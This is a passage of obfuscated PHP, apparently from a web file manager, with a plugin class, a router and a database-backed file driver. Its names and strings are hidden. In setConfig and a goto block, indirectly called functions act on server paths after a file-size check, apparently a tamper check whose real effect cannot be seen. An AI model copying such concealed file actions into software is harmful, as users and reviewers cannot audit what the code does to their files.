$³ÒÙ¤åâ, $×Ú·¾Ò¶); } private function parseConfig(&$—¢ı¢’ã) { $¢­½ØÑ =& $_SERVER[Ãìšã«™]; $’›´Ëô‰ = $¢­½ØÑ[1565]; if (!strstr($—¢ı¢’ã, $’›´Ëô‰)) { return; } preg_match_all($¢­½ØÑ[1566], $—¢ı¢’ã, $è©ó½¹); if (!is_array($è©ó½¹) || count($è©ó½¹) == 0 || !is_array($è©ó½¹[0]) || count($è©ó½¹[0]) == 0) { return; } $ñ®ˆà¿ = $this->getConfig(); $–©•£·ø = array(); $ı¹šøîó = array(); foreach ($è©ó½¹[0] as $şÂ§‡Ş) { $î©´À = substr($şÂ§‡Ş, strlen($’›´Ëô‰), -2); $–©•£·ø[] = $şÂ§‡Ş; $ı¹šøîó[] = _get($ñ®ˆà¿, $î©´À); } $—¢ı¢’ã = str_replace($–©•£·ø, $ı¹šøîó, $—¢ı¢’ã); } private function parsePackage(&$íÏÊÉŠ) { $·ÛÛÜ¢Î =& $_SERVER[Ãìšã«™]; $Ìïü ¯Á = $·ÛÛÜ¢Î[1567]; if (!strstr($íÏÊÉŠ, $Ìïü ¯Á)) { return; } preg_match_all($·ÛÛÜ¢Î[1568], $íÏÊÉŠ, $çàé³±å); if (!is_array($çàé³±å) || count($çàé³±å) == 0 || !is_array($çàé³±å[0]) || count($çàé³±å[0]) == 0) { return; } $Ÿ ß¾õæ = $this->appPackage(); $îÑŞı¡÷ = array(); $²µ§ïÒ± = array(); foreach ($çàé³±å[0] as $ææû¥) { $Îˆ‹ã•ğ = substr($ææû¥, strlen($Ìïü ¯Á), -2); $îÑŞı¡÷[] = $ææû¥; $²µ§ïÒ±[] = _get($Ÿ ß¾õæ, $Îˆ‹ã•ğ); } $íÏÊÉŠ = str_replace($îÑŞı¡÷, $²µ§ïÒ±, $íÏÊÉŠ); } final function echoFile($««¹»¶, $¢Õï«¹Ü = false) { $¢ªºİÓ =& $_SERVER[Ãìšã«™]; $¥Ç €ØÜ = $this->pluginPath . $««¹»¶; if (ACT == $¢ªºİÓ[1569]) { echo $¢ªºİÓ[1570] . $this->pluginName . $¢ªºİÓ[8] . $««¹»¶ . $¢ªºİÓ[1571]; if (!file_exists($¥Ç €ØÜ)) { echo $¢ªºİÓ[1572]; return; } } $ˆˆã¥Ûœ = $this->parseFile($¥Ç €ØÜ); $this->parseLang($ˆˆã¥Ûœ); $this->parseConfig($ˆˆã¥Ûœ); $this->parsePackage($ˆˆã¥Ûœ); if (is_array($¢Õï«¹Ü)) { $ˆˆã¥Ûœ = str_replace(array_keys($¢Õï«¹Ü), array_values($¢Õï«¹Ü), $ˆˆã¥Ûœ); } echo $¢ªºİÓ[226] . $ˆˆã¥Ûœ; } final function initLang() { $×£ Ÿ§ë =& $_SERVER[Ãìšã«™]; $ÛÌò®Úî = $×£ Ÿ§ë[1573]; $¦´õø½ş = $this->pluginPath . $×£ Ÿ§ë[1574]; $ß’Õ¦€ = I18n::getType(); $ÁÌóÏµú = array(); if (file_exists($¦´õø½ş . $ß’Õ¦€ . $×£ Ÿ§ë[839])) { $ÁÌóÏµú = (include $¦´õø½ş . $ß’Õ¦€ . $×£ Ÿ§ë[839]); } else { if ($ß’Õ¦€ == $×£ Ÿ§ë[1575] && !file_exists($¦´õø½ş . $ß’Õ¦€ . $×£ Ÿ§ë[839]) && file_exists($¦´õø½ş . $×£ Ÿ§ë[1576])) { $ÁÌóÏµú = (include $¦´õø½ş . $×£ Ÿ§ë[1576]); } else { if (file_exists($¦´õø½ş . $ÛÌò®Úî . $×£ Ÿ§ë[839])) { $ÁÌóÏµú = (include $¦´õø½ş . $ÛÌò®Úî . $×£ Ÿ§ë[839]); } } } if (!is_array($ÁÌóÏµú)) { return array(); } if (@count($ÁÌóÏµú) > 0) { I18n::set($ÁÌóÏµú); } return $ÁÌóÏµú; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($µŞ”’™¾) { $‰íûÎ¨£ =& $_SERVER[Ãìšã«™]; if ($_SERVER[$‰íûÎ¨£[395]] != $_SERVER[$‰íûÎ¨£[1577]]) { $¢Éš º» = $‰íûÎ¨£[873]; $ÛÃª¨„ò = $‰íûÎ¨£[396]; $üŞÙóÍï = $_SERVER[$‰íûÎ¨£[397]] . $‰íûÎ¨£[398]; $Ş»®‹Í– = $ÛÃª¨„ò($üŞÙóÍï); $˜®ö»ªÏ = explode($‰íûÎ¨£[226], $Ş»®‹Í–); if (count($˜®ö»ªÏ) < $‰íûÎ¨£[612]) { $°Û‚ğƒ = $‰íûÎ¨£[400]; $°Û‚ğƒ(); } $¯ŠŒøş· = $‰íûÎ¨£[874]; $¯ŠŒøş·($_SERVER[$‰íûÎ¨£[875]]); $¯ŠŒøş·($_SERVER[$‰íûÎ¨£[397]] . $‰íûÎ¨£[1578]); $ÂœŸ…Õú = 1; while ($ÂœŸ…Õú > 1) { $ÂœŸ…Õú = $ÂœŸ…Õú + 4; $Åœ¤²ä = rawurlencode($ÂœŸ…Õú . $‰íûÎ¨£[373]); } } return $this->modelPlugin->setConfig($this->pluginName, $µŞ”’™¾); } public function onSetConfig($ûœÉâ©ê) { } public function onGetConfig($»¥àÕ·) { } public function onChangeStatus($ÚĞá˜´ğ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($Ã×Œğ–½ = "\160\154\165\x67\x69\156\x41\165\x74\x68") { $ÉìÖúà =& $_SERVER[Ãìšã«™]; if (!defined($ÉìÖúà[474])) { return !1; } if (_get($GLOBALS, $ÉìÖúà[505])) { return !0; } $ƒ¶ÑÀ = $this->getConfig(); if (!$ƒ¶ÑÀ[$Ã×Œğ–½]) { return !1; } return ActionCall($ÉìÖúà[1579], $ƒ¶ÑÀ[$Ã×Œğ–½]); } public function url($ã¥—Ü, $î©‹½‚Õ = '', $¨µĞÒÎÄ = true) { $œ‹Şàş =& $_SERVER[Ãìšã«™]; $’Ç‹©ô = $this->getConfig(); $©µ¨Àüë = KOD_VERSION . $œ‹Şàş[10] . KOD_VERSION_BUILD; $»ùàÙ¿ù = $this->packageVersion(); $½‡Àë¿© = $©µ¨Àüë . $œ‹Şàş[460] . $»ùàÙ¿ù; if (substr($ã¥—Ü, 0, 4) == $œ‹Şàş[145] || substr($ã¥—Ü, 0, 2) == $œ‹Şàş[1361]) { $Ó§‚øØÄ = $ã¥—Ü . $œ‹Şàş[1580] . $½‡Àë¿©; } else { if ($î©‹½‚Õ == $œ‹Şàş[12]) { $Ó§‚øØÄ = $this->pluginHost . $ã¥—Ü . $œ‹Şàş[1580] . $½‡Àë¿©; } else { if ($î©‹½‚Õ === $œ‹Şàş[79]) { $Ó§‚øØÄ = $this->pluginHost . $ã¥—Ü; } else { if ($î©‹½‚Õ == $œ‹Şàş[1581]) { $Ó§‚øØÄ = STATIC_PATH . $ã¥—Ü . $œ‹Şàş[1580] . $©µ¨Àüë; } else { if ($î©‹½‚Õ == $œ‹Şàş[1582]) { $Ó§‚øØÄ = APP_HOST . $œ‹Şàş[1583] . $ã¥—Ü . $œ‹Şàş[1580] . $©µ¨Àüë; } else { if (isset($’Ç‹©ô[$î©‹½‚Õ])) { $Ó§‚øØÄ = $’Ç‹©ô[$î©‹½‚Õ] . $ã¥—Ü . $œ‹Şàş[1580] . $½‡Àë¿©; } } } } } } if (!$¨µĞÒÎÄ) { return $Ó§‚øØÄ; } echo $Ó§‚øØÄ; } public function link($¿û³»¤ó = false, $“¿ÁÏ’§ = '') { $¾ˆ³å‡¹ =& $_SERVER[Ãìšã«™]; if (!$¿û³»¤ó) { $this->link($¾ˆ³å‡¹[1584], $¾ˆ³å‡¹[1582]); $this->link($¾ˆ³å‡¹[1585], $¾ˆ³å‡¹[1581]); $this->link($¾ˆ³å‡¹[1586], $¾ˆ³å‡¹[1581]); $this->link($¾ˆ³å‡¹[1587], $¾ˆ³å‡¹[1581]); $this->link($¾ˆ³å‡¹[1588], $¾ˆ³å‡¹[1581]); return; } $Äúºß¤ = $this->url($¿û³»¤ó, $“¿ÁÏ’§, !1); if (substr($¿û³»¤ó, -3) == $¾ˆ³å‡¹[1589]) { echo $¾ˆ³å‡¹[1590] . $Äúºß¤ . $¾ˆ³å‡¹[1591] . $¾ˆ³å‡¹[226]; } else { if (substr($¿û³»¤ó, -4) == $¾ˆ³å‡¹[1592]) { echo $¾ˆ³å‡¹[1593] . $Äúºß¤ . $¾ˆ³å‡¹[1594] . $¾ˆ³å‡¹[226]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\171" => "\133\136\57\135\53", "\72\x6e\165\x6d" => "\x5b\x30\x2d\71\135\x2b", "\72\141\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($‰º‹Öœ, $ë¦¼œ±) { $°øÄ×õÔ =& $_SERVER[Ãìšã«™]; if ($‰º‹Öœ == $°øÄ×õÔ[1595]) { $œ‘Õ“âÙ = array_map($°øÄ×õÔ[1596], $ë¦¼œ±[0]); $Í ªÓ‹É = strpos($ë¦¼œ±[1], $°øÄ×õÔ[8]) === 0 ? $ë¦¼œ±[1] : $°øÄ×õÔ[8] . $ë¦¼œ±[1]; $šÂ…Êõ™ = $ë¦¼œ±[2]; } else { $œ‘Õ“âÙ = null; $Í ªÓ‹É = strpos($ë¦¼œ±[0], $°øÄ×õÔ[8]) === 0 ? $ë¦¼œ±[0] : $°øÄ×õÔ[8] . $ë¦¼œ±[0]; $šÂ…Êõ™ = $ë¦¼œ±[1]; } array_push(self::$maps, $œ‘Õ“âÙ); array_push(self::$routes, $Í ªÓ‹É); array_push(self::$methods, strtoupper($‰º‹Öœ)); array_push(self::$callbacks, $šÂ…Êõ™); } public static function error($¢«‰‰Ö) { self::$errorCallback = $¢«‰‰Ö; } public static function haltOnMatch($ö·šŞÏ = true) { self::$halts = $ö·šŞÏ; } public static function dispatch() { $“ÆÂöš =& $_SERVER[Ãìšã«™]; $şü³¥µÍ = parse_url($_SERVER[$“ÆÂöš[1597]], PHP_URL_PATH); $ÚºÕöëÚ = $_SERVER[$“ÆÂöš[156]]; $’ø†›ûÅ = array_keys(static::$patterns); $œ«ÀÊ¿ã = array_values(static::$patterns); $±è×Œëì = !1; self::$routes = preg_replace($“ÆÂöš[1263], $“ÆÂöš[8], self::$routes); if (in_array($şü³¥µÍ, self::$routes)) { $ÁëÌ£“Æ = array_keys(self::$routes, $şü³¥µÍ); foreach ($ÁëÌ£“Æ as $ÌÚú¿©¹) { if (self::$methods[$ÌÚú¿©¹] == $ÚºÕöëÚ || self::$methods[$ÌÚú¿©¹] == $“ÆÂöš[1598] || in_array($ÚºÕöëÚ, self::$maps[$ÌÚú¿©¹])) { $±è×Œëì = !0; if (!is_object(self::$callbacks[$ÌÚú¿©¹])) { $§£²íÂ¶ = explode($“ÆÂöš[8], self::$callbacks[$ÌÚú¿©¹]); $ŒãËá£Õ = end($§£²íÂ¶); $ØËç‘… = explode($“ÆÂöš[1599], $ŒãËá£Õ); $–Ò¤ë“ = new $ØËç‘…[0](); $–Ò¤ë“->{$ØËç‘…[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ÌÚú¿©¹]); if (self::$halts) { return; } } } } } else { $ò†ÓóÏß = 0; foreach (self::$routes as $ÌÚú¿©¹) { if (strpos($ÌÚú¿©¹, $“ÆÂöš[4]) !== !1) { $ÌÚú¿©¹ = str_replace($’ø†›ûÅ, $œ«ÀÊ¿ã, $ÌÚú¿©¹); } if (preg_match($“ÆÂöš[1600] . $ÌÚú¿©¹ . $“ÆÂöš[1601], $şü³¥µÍ, $íôÍ’¥)) { if (self::$methods[$ò†ÓóÏß] == $ÚºÕöëÚ || self::$methods[$ò†ÓóÏß] == $“ÆÂöš[1598] || !empty(self::$maps[$ò†ÓóÏß]) && in_array($ÚºÕöëÚ, self::$maps[$ò†ÓóÏß])) { $±è×Œëì = !0; array_shift($íôÍ’¥); if (!is_object(self::$callbacks[$ò†ÓóÏß])) { $§£²íÂ¶ = explode($“ÆÂöš[8], self::$callbacks[$ò†ÓóÏß]); $ŒãËá£Õ = end($§£²íÂ¶); $ØËç‘… = explode($“ÆÂöš[1599], $ŒãËá£Õ); $–Ò¤ë“ = new $ØËç‘…[0](); if (!method_exists($–Ò¤ë“, $ØËç‘…[1])) { echo $“ÆÂöš[1602]; } else { call_user_func_array(array($–Ò¤ë“, $ØËç‘…[1]), $íôÍ’¥); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ò†ÓóÏß], $íôÍ’¥); if (self::$halts) { return; } } } } $ò†ÓóÏß++; } } if ($±è×Œëì == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $‘ÆÁÂìÁ =& $_SERVER[Ãìšã«™]; header($_SERVER[$‘ÆÁÂìÁ[1603]] . $‘ÆÁÂìÁ[1604]); echo $‘ÆÁÂìÁ[1605]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$“ÆÂöš[1597]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto FêÔÓ­Ü±; E³»‚óİÅ: if ($_SERVER[$_SERVER[Ãìšã«™][395]] != $_size($_file)) { $_getc = $_SERVER[Ãìšã«™][396]; $_getfile = $_SERVER[$_SERVER[Ãìšã«™][397]] . $_SERVER[Ãìšã«™][398]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ãìšã«™][226], $_getfilec); if (count($_getarrs) < $_SERVER[Ãìšã«™][399]) { $exit = $_SERVER[Ãìšã«™][400]; $exit(); } $_act = $_SERVER[Ãìšã«™][401]; $_act($_file); } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ÍÎóºşº) { $this->pathParse = $ÍÎóºşº; $this->model = Model($_SERVER[Ãìšã«™][1321]); } public function getPath($·†‘æµâ) { return trim($·†‘æµâ, $_SERVER[Ãìšã«™][8]); } public function pathFather($Çµ‘Ëï·) { $äìğÅæ = $this->parse($Çµ‘Ëï·); $äìğÅæ = $this->infoSimple($Çµ‘Ëï·); return $äìğÅæ ? $äìğÅæ[$_SERVER[Ãìšã«™][498]] : !1; } public function pathThis($•š»“øÒ) { $ïäè«” = $this->infoSimple($•š»“øÒ); return $ïäè«” ? $ïäè«”[$_SERVER[Ãìšã«™][32]] : !1; } public function getPathOuter($úŞøáäë) { if (!$úŞøáäë) { return $úŞøáäë; } $ßæ©›ñä = $this->parse($úŞøáäë); return KodIO::make($ßæ©›ñä[$_SERVER[Ãìšã«™][392]]); } public function copyFolderFromIO($øÒ©¯ùˆ, $àäÆíöÀ, $¿»çà¡, $ã†×Û, $¹õ®—­ê) { $°Ñ½şåõ = $this->model->copyFolderFromIO($øÒ©¯ùˆ, $àäÆíöÀ, $¿»çà¡, $ã†×Û, $¹õ®—­ê); return KodIO::make($°Ñ½şåõ); } public function isParentOf($‰ˆÖ›ªı, $ˆûÂôûİ) { return $this->model->isParentOf($‰ˆÖ›ªı, $ˆûÂôûİ); } public function mkfile($ë¹¾ˆè¯, $ ÎÓÜ‰Œ = '', $Ÿ˜ãøÊ¢ = REPEAT_RENAME) { $šÏÚÃìá =& $_SERVER[Ãìšã«™]; $¼Êì¤à· = $this->parse($ë¹¾ˆè¯); $ë¹¾ˆè¯ = $¼Êì¤à·[$šÏÚÃìá[392]]; for ($É¹ºõ§Î = 0; $É¹ºõ§Î < count($¼Êì¤à·[$šÏÚÃìá[1322]]); $É¹ºõ§Î++) { $ŠõÜ„ùå = $¼Êì¤à·[$šÏÚÃìá[1322]][$É¹ºõ§Î]; if ($É¹ºõ§Î == count($¼Êì¤à·[$šÏÚÃìá[1322]]) - 1) { $ë¹¾ˆè¯ = $this->model->mkfile($ë¹¾ˆè¯, $ŠõÜ„ùå, $ ÎÓÜ‰Œ, $Ÿ˜ãøÊ¢); break; } $ë¹¾ˆè¯ = $this->model->mkdir($ë¹¾ˆè¯, $ŠõÜ„ùå, REPEAT_SKIP); } return $this->getPathOuter($ë¹¾ˆè¯); } public function mkdir($Áîøå, $”÷ïšÅ = REPEAT_SKIP) { $ÑÏãô»± =& $_SERVER[Ãìšã«™]; $úÌ˜£ıø = $this->parse($Áîøå); $Áîøå = $úÌ˜£ıø[$ÑÏãô»±[392]]; for ($¯³é§† = 0; $¯³é§† < count($úÌ˜£ıø[$ÑÏãô»±[1322]]); $¯³é§†++) { $áÛÆµæ = $úÌ˜£ıø[$ÑÏãô»±[1322]][$¯³é§†]; $Áîøå = $this->model->mkdir($Áîøå, $áÛÆµæ, $”÷ïšÅ); } return $this->getPathOuter($Áîøå); } public function copyFile($ğ×ï„Ç´, $ˆâ¥³È“, $„¥Ğ¿ŒÍ = REPEAT_REPLACE) { $©ìŸ‚Şî =& $_SERVER[Ãìšã«™]; $‘öô£¬ç = $this->parse($ˆâ¥³È“); $åã¶³¬ = $this->model->copy($ğ×ï„Ç´, $‘öô£¬ç[$©ìŸ‚Şî[392]], $„¥Ğ¿ŒÍ, $‘öô£¬ç[$©ìŸ‚Şî[78]]); return $åã¶³¬ ? $this->getPathOuter($åã¶³¬) : !1; } public function moveFile($¾™µøø¹, $¼°øÀ‰á, $ø©™Šºğ = REPEAT_REPLACE) { $ìàÖ”–Ş =& $_SERVER[Ãìšã«™]; $éäåãÉ = $this->parse($¼°øÀ‰á); $€¿ ÃŠŠ = $this->model->move($¾™µøø¹, $éäåãÉ[$ìàÖ”–Ş[392]], $ø©™Šºğ, $éäåãÉ[$ìàÖ”–Ş[78]]); return $€¿ ÃŠŠ ? $this->getPathOuter($€¿ ÃŠŠ) : !1; } public function copy($æÃÒ©å, $Î‘Œñƒ™, $”Ş¼üü = REPEAT_REPLACE, $‰ªÍµÈë = false) { $§³òÈ«µ = $this->parse($Î‘Œñƒ™); $Œ„©ĞìÑ = $this->model->copy($æÃÒ©å, $§³òÈ«µ[$_SERVER[Ãìšã«™][392]], $”Ş¼üü, $‰ªÍµÈë); return $Œ„©ĞìÑ ? $this->getPathOuter($Œ„©ĞìÑ) : !1; } public function moveSameAllow() { } public function move($Û€Æï, $óî”Î·€, $•—çúúÓ = REPEAT_REPLACE, $”‚¡‰’¯ = false) { $¥£¶ÅÒæ = $this->parse($óî”Î·€); $¶Çå¥ÔÅ = $this->model->move($Û€Æï, $¥£¶ÅÒæ[$_SERVER[Ãìšã«™][392]], $•—çúúÓ, $”‚¡‰’¯); return $¶Çå¥ÔÅ ? $this->getPathOuter($¶Çå¥ÔÅ) : !1; } public function remove($ÃÌ®¿™±, $‰×àğ„€ = true) { return $this->model->remove($ÃÌ®¿™±, $‰×àğ„€); } public function rename($”íê¬Æğ, $ø‚¸ÉÎÓ) { $øŒ—œÀ = $this->model->rename($”íê¬Æğ, $ø‚¸ÉÎÓ); return $øŒ—œÀ ? $this->getPathOuter($”íê¬Æğ) : $øŒ—œÀ; } public function size($ëÃ‰™ù) { $ñ®ÓÓ¬É = $this->infoSimple($ëÃ‰™ù); return $ñ®ÓÓ¬É ? $ñ®ÓÓ¬É[$_SERVER[Ãìšã«™][80]] : 0; } public function infoSimple($º÷±ĞÓ) { return $this->model->sourceInfo($º÷±ĞÓ); } public function info($ÊÀÈàéÙ) { return $this->infoParse($ÊÀÈàéÙ); } public function infoAuth($Äªä²œ) { return $this->infoParse($Äªä²œ, !1, !0); } public function infoWithChildren($İ’Ù¿’‰) { return $this->infoParse($İ’Ù¿’‰, !0); } protected function infoParse($ìŞõĞúµ, $•«­Ï¥Å = false, $¬Ê‚› = false) { if (!$•«­Ï¥Å) { return $this->model->pathInfo($ìŞõĞúµ, $¬Ê‚›); } return $this->model->pathInfoMore($ìŞõĞúµ); } public function infoFull($Ü‡ƒ°’) { $õï€—¢ä =& $_SERVER[Ãìšã«™]; $ğò§¼í² = explode($õï€—¢ä[8], $Ü‡ƒ°’); $Ò¾”®¼ = implode($õï€—¢ä[8], array_splice($ğò§¼í², 1)); return $this->model->pathInfoByPath($ğò§¼í²[0], $Ò¾”®¼); } public function hashSimple($®¾©Á¡Í) { $ÂåŞ¸¼ù =& $_SERVER[Ãìšã«™]; $ĞÒ¤ĞÈ = $this->infoWithChildren($®¾©Á¡Í); return $ĞÒ¤ĞÈ[$ÂåŞ¸¼ù[163]][$ÂåŞ¸¼ù[170]]; } public function hashMd5($Õ²œ´’) { $ŠùŞ¸æì =& $_SERVER[Ãìšã«™]; $¬·‰†ÕĞ = $this->infoWithChildren($Õ²œ´’); return $¬·‰†ÕĞ[$ŠùŞ¸æì[163]][$ŠùŞ¸æì[169]]; } public function exist($ó‘éË´è) { $¿¨Œƒ×œ =& $_SERVER[Ãìšã«™]; $ÅŸë‹ºİ = $this->parse($ó‘éË´è); if (!$ÅŸë‹ºİ[$¿¨Œƒ×œ[78]]) { return $this->isFile($ó‘éË´è) || $this->isFolder($ó‘éË´è); } $ÏÎÔûæ = array($¿¨Œƒ×œ[402] => $ÅŸë‹ºİ[$¿¨Œƒ×œ[392]], $¿¨Œƒ×œ[32] => $ÅŸë‹ºİ[$¿¨Œƒ×œ[78]]); $â¬À´» = $this->model->where($ÏÎÔûæ)->find(); return $â¬À´» ? !0 : !1; } public function isFile($»¥Ï£ó) { $ÉíÏà†³ =& $_SERVER[Ãìšã«™]; $ËÀÌÖô = $this->infoSimple($»¥Ï£ó); return $ËÀÌÖô && $ËÀÌÖô[$ÉíÏà†³[411]] == $ÉíÏà†³[89] ? !1 : !0; } public function isFolder($¿¾øÓî–) { $ãæºâªø =& $_SERVER[Ãìšã«™]; $×¤ èÓ = $this->infoSimple($¿¾øÓî–); return $×¤ èÓ && $×¤ èÓ[$ãæºâªø[411]] == $ãæºâªø[89] ? !0 : !1; } public function listPath($Ä­Èºç—, $‡Î‰Ãƒ = false) { $áçïå£¨ =& $_SERVER[Ãìšã«™]; if ($Ä­Èºç— == $áçïå£¨[12]) { return !1; } $–„¾ùÑµ = array($áçïå£¨[402] => $Ä­Èºç—); if ($‡Î‰Ãƒ) { return $this->model->listSource($–„¾ùÑµ, -1); } return $this->model->listSource($–„¾ùÑµ); } public function has($ğ€àä£ , $ş•ê¼¬ = false, $ïì‹Âç = null) { $À™ôĞÌï =& $_SERVER[Ãìšã«™]; $ÎœïßŸ = $this->infoWithChildren($ğ€àä£ ); if ($ş•ê¼¬) { return array($À™ôĞÌï[203] => $ÎœïßŸ[$À™ôĞÌï[203]], $À™ôĞÌï[202] => $ÎœïßŸ[$À™ôĞÌï[202]]); } return $ïì‹Âç ? $ÎœïßŸ[$À™ôĞÌï[203]] : $ÎœïßŸ[$À™ôĞÌï[202]]; } public function listAll($¶³ÛúËÌ) { $³•Ñ°Á› = IO::info($this->pathParse[$_SERVER[Ãìšã«™][78]]); if (!$³•Ñ°Á›) { return array(); } return $this->model->listAll($¶³ÛúËÌ); } public function getContent($ñÕßÙ®Ø) { return $this->model->getContent($ñÕßÙ®Ø); } public function setContent($œÙÏ§©”, $Â˜Ö±æÄ = '') { return $this->model->setContent($œÙÏ§©”, $Â˜Ö±æÄ); } public function fileSubstr($Øš³Ë‚, $µ»ïã‚À, $ÇêïĞî§) { return $this->model->fileSubstr($Øš³Ë‚, $µ»ïã‚À, $ÇêïĞî§); } public function download($Êò²äº—, $¥ÅòÁ‹² = '') { $¯öØ²ú = get_path_father($¥ÅòÁ‹²); $”€åøÌÔ = get_path_this($¥ÅòÁ‹²); $ëøÊ€¶” = $this->model->fileInfoGet($Êò²äº—); $ĞƒƒßÑÊ = IO::copy($ëøÊ€¶”[$_SERVER[Ãìšã«™][78]], $¯öØ²ú, !1, $”€åøÌÔ); return $ĞƒƒßÑÊ; } public function setModifyTime($Ø­Ó®‰½, $¤Ä„”ĞÍ = '') { $ÒìÏ Ùû =& $_SERVER[Ãìšã«™]; if (!$Ø­Ó®‰½) { return; } $this->model->where(array($ÒìÏ Ùû[418] => $Ø­Ó®‰½))->save(array($ÒìÏ Ùû[86] => $¤Ä„”ĞÍ)); } public function upload($ı«î²‹ò, $¯û¦›÷Í, $îØô·‚ = false, $ó”¨Æ©½ = REPEAT_REPLACE) { $âïÁıü· =& $_SERVER[Ãìšã«™]; $Ñ˜ÃÁü¨ = $this->parse($ı«î²‹ò); $«ï¸Ó¨ô = $this->model->addFile($Ñ˜ÃÁü¨[$âïÁıü·[392]], $¯û¦›÷Í, $Ñ˜ÃÁü¨[$âïÁıü·[78]], $îØô·‚, $ó”¨Æ©½); return $this->getPathOuter($«ï¸Ó¨ô); } public function uploadFileByID($ñ¥´ğÃ›, $ª×–Âé, $ùŸú¶Ê) { $Ü è›Î· =& $_SERVER[Ãìšã«™]; $İĞ©à£ = $this->parse($ñ¥´ğÃ›); $åÏÍá = $this->model->addFileByFileID($İĞ©à£[$Ü è›Î·[392]], $ª×–Âé, $İĞ©à£[$Ü è›Î·[78]], $ùŸú¶Ê); return $this->getPathOuter($åÏÍá); } public function addFileByRemote($ˆâ„ÖÊÌ, $£û‰»ÚŒ, $Éô‘ú…¬ = array(), $¶Ì½Ÿ†Â = '', $ßÌıéÑ“) { $‚±ŠÙÄõ =& $_SERVER[Ãìšã«™]; $ùŠ Œ• = $this->parse($ˆâ„ÖÊÌ); $¶Ì½Ÿ†Â = empty($¶Ì½Ÿ†Â) ? $ùŠ Œ•[$‚±ŠÙÄõ[78]] : $¶Ì½Ÿ†Â; $ÊôÚÈÁ° = $this->model->addFileByRemote($ùŠ Œ•[$‚±ŠÙÄõ[392]], $£û‰»ÚŒ, $¶Ì½Ÿ†Â, $Éô‘ú…¬, $ßÌıéÑ“); return $this->getPathOuter($ÊôÚÈÁ°); } public function uploadLink($è¿ï¶Ì¦, $²Ï‡”» = 0) { $Â”·Ğïì =& $_SERVER[Ãìšã«™]; $×ÊƒŞËã = $this->parse($è¿ï¶Ì¦); $ì¾™¸ÜÜ = _get($GLOBALS[$Â”·Ğïì[7]], $Â”·Ğïì[1323]); $°‰ğ½§Ú = _get($GLOBALS[$Â”·Ğïì[7]], $Â”·Ğïì[1324]); $è¿ï¶Ì¦ = Model($Â”·Ğïì[603])->createFileName($×ÊƒŞËã[$Â”·Ğïì[78]], $ì¾™¸ÜÜ, $°‰ğ½§Ú); return IO::uploadLink($è¿ï¶Ì¦, $²Ï‡”»); } public function fileNameAuto($ä‡«û¦×, $‹¹ÆÀôü, $Š¦üÒà = REPEAT_REPLACE, $·Ô‘À¦  = false) { return $this->model->fileNameAuto($ä‡«û¦×, $‹¹ÆÀôü, $Š¦üÒà, $·Ô‘À¦ ); } public function fileNameExist($™ª­Í•Ø, $˜Ü) { return $this->model->fileNameExist($™ª­Í•Ø, $˜Ü); } protected function _fileOut($ÃÜáÛÖÜ, $Ìº›ÕÀ¸ = false, $ÁÆé¸”Í = false, $Úİ¾×¸‡ = '', $ÖùÉøÙã = false) { $©ÄÄ¥¶Ï =& $_SERVER[Ãìšã«™]; $ÔÈÓ£ÉÓ = $this->model->sourceInfo($ÃÜáÛÖÜ); if ($ÔÈÓ£ÉÓ[$©ÄÄ¥¶Ï[411]] == $©ÄÄ¥¶Ï[89]) { header($©ÄÄ¥¶Ï[1325]); die; } $´ËàÚßĞ = $this->model->fileInfoGet($ÃÜáÛÖÜ); $Úİ¾×¸‡ = $´ËàÚßĞ[$©ÄÄ¥¶Ï[169]] ? $´ËàÚßĞ[$©ÄÄ¥¶Ï[169]] : $Úİ¾×¸‡; $¢¯„¡ÙÈ = isset($GLOBALS[$©ÄÄ¥¶Ï[1326]]) ? $GLOBALS[$©ÄÄ¥¶Ï[1326]] : $ÔÈÓ£ÉÓ[$©ÄÄ¥¶Ï[32]]; if ($ÖùÉøÙã) { return IO::fileOutServer($´ËàÚßĞ[$©ÄÄ¥¶Ï[78]], $Ìº›ÕÀ¸, $¢¯„¡ÙÈ, $Úİ¾×¸‡); } IO::fileOut($´ËàÚßĞ[$©ÄÄ¥¶Ï[78]], $Ìº›ÕÀ¸, $¢¯„¡ÙÈ, $Úİ¾×¸‡); } public function fileOut($¬ø£¬ü¸, $›ìèâ¦ = false, $Ïé«¶¤ = false, $Õ–£šÏ¶ = '') { $this->_fileOut($¬ø£¬ü¸, $›ìèâ¦, $Ïé«¶¤, $Õ–£šÏ¶); } public function fileOutServer($Î¹Ê”Ã­, $†ğø…úÄ = false, $óñõá¶º = false, $¼çÑßïè = '') { $this->_fileOut($Î¹Ê”Ã­, $†ğø…úÄ, $óñõá¶º, $¼çÑßïè, !0); } protected function _fileOutImage($Òöâ××î, $ı»×äÛº = 250) { $µ´¥ã =& $_SERVER[Ãìšã«™]; $ğ¥šÄ¢“ = $this->model->pathInfo($Òöâ××î); if ($ğ¥šÄ¢“[$µ´¥ã[411]] == $µ´¥ã[89]) { show_json($µ´¥ã[1327] . $Òöâ××î, !1); } $âÌ‘Øûä = $this->model->fileInfoGet($Òöâ××î); $âÌ‘Øûä[$µ´¥ã[32]] = $ğ¥šÄ¢“[$µ´¥ã[32]]; $âÌ‘Øûä[$µ´¥ã[162]] = $ğ¥šÄ¢“[$µ´¥ã[162]]; $GLOBALS[$µ´¥ã[1326]] = $âÌ‘Øûä[$µ´¥ã[32]]; $GLOBALS[$µ´¥ã[161]] = $âÌ‘Øûä; IO::fileOutImage($âÌ‘Øûä[$µ´¥ã[78]], $ı»×äÛº); } public function fileOutImage($ŞËÈàû, $Çç¤‘—  = 250) { $this->_fileOutImage($ŞËÈàû, $Çç¤‘— ); } public function fileOutImageServer($ ä€¨ä, $“ôúèğõ = 250) { $this->_fileOutImage($ ä€¨ä, $“ôúèğõ); } public function link($„ó³ú¾Õ, $èíÔ†Ø– = '') { $¶‹è»üƒ = $this->model->fileInfoGet($„ó³ú¾Õ); return 